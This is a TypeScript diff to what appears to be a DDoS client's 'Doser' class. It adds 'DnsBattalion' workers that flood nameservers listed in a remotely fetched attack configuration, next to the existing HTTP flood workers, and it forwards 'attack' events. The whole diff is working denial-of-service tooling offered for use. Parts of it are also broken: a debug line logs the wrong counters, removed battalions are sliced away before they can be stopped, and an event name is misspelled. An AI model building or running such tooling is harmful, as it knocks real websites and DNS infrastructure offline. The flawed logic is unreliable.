@@ -4,6 +4,7 @@ import { DoserEventType, GetSitesAndProxiesResponse } from './types'
 import { Runner } from './runner'
 import { ConfigurationService } from './services/configurationService'
 import { Timeout } from './utils/timeout'
+import { DnsBattalion } from './dnsBattalion'
 
 const CONFIGURATION_WAIT_MIN_TIMEOUT = 10000 // 10 sec
 const CONFIGURATION_WAIT_MAX_TIMEOUT = 120000 // 2 min
@@ -13,22 +14,31 @@ export class Doser {
   private hosts: Array<string> = []
   private working: boolean
   private workers: Runner[] = []
+  private dnsBattalions: DnsBattalion[] = []
   private numberOfWorkers = 0
+  private activeDnsBattalionsNumber = 0
   private eventSource: EventEmitter
   private ddosConfiguration: GetSitesAndProxiesResponse | null = null
 
   private verboseError: boolean
-  private capacity: number
+  private httpWorkersCapacity: number
+  private dnsBattalionsCapacity: number
   private configurationService: ConfigurationService
 
-  constructor (onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
+  constructor (
+    onlyProxy: boolean,
+    numberOfHttpWorkers: number,
+    numberOfDnsWorkers: number,
+    verboseError: boolean
+  ) {
     this.configurationService = new ConfigurationService()
     this.onlyProxy = onlyProxy
     this.working = false
     this.eventSource = new EventEmitter()
-    this.capacity = numberOfWorkers
+    this.httpWorkersCapacity = numberOfHttpWorkers
+    this.dnsBattalionsCapacity = numberOfDnsWorkers
     this.verboseError = verboseError
-    console.log(`Init doser. Capacity: ${this.capacity}`)
+    console.log(`Init doser. Http capacity: ${this.httpWorkersCapacity}. Dns capacity: ${this.dnsBattalionsCapacity}`)
     this.initialize(Timeout.zero())
   }
 
@@ -107,23 +117,28 @@ export class Doser {
   }
 
   private startWorkers () {
-    if (this.capacity === this.numberOfWorkers) {
+    this.startWebSitesWorkers()
+    this.startDnsWorkers()
+  }
+
+  private startWebSitesWorkers () {
+    if (this.httpWorkersCapacity === this.numberOfWorkers) {
       return
     }
-    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${this.capacity}`)
-    if (this.capacity < this.numberOfWorkers) {
-      for (let i = this.numberOfWorkers; i >= this.capacity; i--) {
+    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${this.httpWorkersCapacity}`)
+    if (this.httpWorkersCapacity < this.numberOfWorkers) {
+      for (let i = this.numberOfWorkers; i >= this.httpWorkersCapacity; i--) {
         this.workers[i]?.eventSource.removeAllListeners()
         this.workers[i]?.stop()
       }
-      this.workers = this.workers.slice(0, this.capacity)
+      this.workers = this.workers.slice(0, this.httpWorkersCapacity)
     } else {
       // we don't want to spawn new workers with old configuration
       if (this.configurationService.expired()) {
         console.log('Can not start due to deprecated configuration')
         return
       }
-      while (this.workers.length < this.capacity) {
+      while (this.workers.length < this.httpWorkersCapacity) {
         const newWorker = this.createNewWorker()
         this.workers.push(newWorker)
         if (this.working) {
@@ -133,7 +148,36 @@ export class Doser {
         }
       }
     }
-    this.numberOfWorkers = this.capacity
+    this.numberOfWorkers = this.httpWorkersCapacity
+  }
+
+  private startDnsWorkers () {
+    if (this.dnsBattalionsCapacity === this.activeDnsBattalionsNumber) {
+      return
+    }
+    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${this.httpWorkersCapacity}`)
+    if (this.dnsBattalionsCapacity < this.activeDnsBattalionsNumber) {
+      this.dnsBattalions = this.dnsBattalions.slice(0, this.dnsBattalionsCapacity)
+      for (const battalion of this.dnsBattalions.slice(this.dnsBattalionsCapacity)) {
+        battalion.stop()
+      }
+    } else {
+      // we don't want to spawn new workers with old configuration
+      if (this.configurationService.expired()) {
+        console.log('Can not start due to deprecated configuration')
+        return
+      }
+      while (this.dnsBattalions.length < this.dnsBattalionsCapacity) {
+        const newBattalion = this.createDnsBattalion()
+        this.dnsBattalions.push(newBattalion)
+        if (this.working) {
+          newBattalion.start().catch(error => {
+            console.debug('Wasnt able to start new runner:', error)
+          })
+        }
+      }
+    }
+    this.activeDnsBattalionsNumber = this.dnsBattalionsCapacity
   }
 
   start () {
@@ -180,12 +224,28 @@ export class Doser {
     return worker
   }
 
+  private createDnsBattalion (): DnsBattalion {
+    console.debug('Creating dns battalion..')
+    // Should never happen
+    if (!this.ddosConfiguration) {
+      throw new Error('Cannot create worker without configuration')
+    }
+    const battalion:DnsBattalion = new DnsBattalion(this.ddosConfiguration.nameservers)
+    battalion.on('attack', event => {
+      this.eventSource.emit('atack', {
+        type: 'atack',
+        ...event
+      })
+    })
+    return battalion
+  }
+
   listen (event: DoserEventType, callback: (data: any) => void) {
     this.eventSource.addListener(event, callback)
   }
 
   updateCapacity (numberOfWorkers: number) {
-    this.capacity = numberOfWorkers
+    this.httpWorkersCapacity = numberOfWorkers
     this.startWorkers()
   }
 }
